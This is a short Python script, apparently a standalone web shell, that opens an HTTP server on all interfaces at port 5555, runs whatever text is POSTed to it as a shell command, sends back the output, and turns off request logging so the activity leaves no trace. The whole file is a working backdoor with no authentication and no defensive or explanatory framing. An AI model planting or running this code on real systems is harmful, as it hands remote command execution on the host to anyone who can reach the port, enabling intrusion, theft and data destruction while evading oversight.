import subprocess
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class WebShellHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        cmd = self.rfile.read(length).decode().strip()
        try:
            out = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT, timeout=10,
                stdin=subprocess.DEVNULL
            )
        except subprocess.CalledProcessError as e:
            out = e.output
        except Exception as e:
            out = str(e).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(out)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(out)

    def log_message(self, *args):
        pass

def start_webshell():
    HTTPServer(("0.0.0.0", 5555), WebShellHandler).serve_forever()

threading.Thread(target=start_webshell, daemon=True).start()

import time
time.sleep(86400)
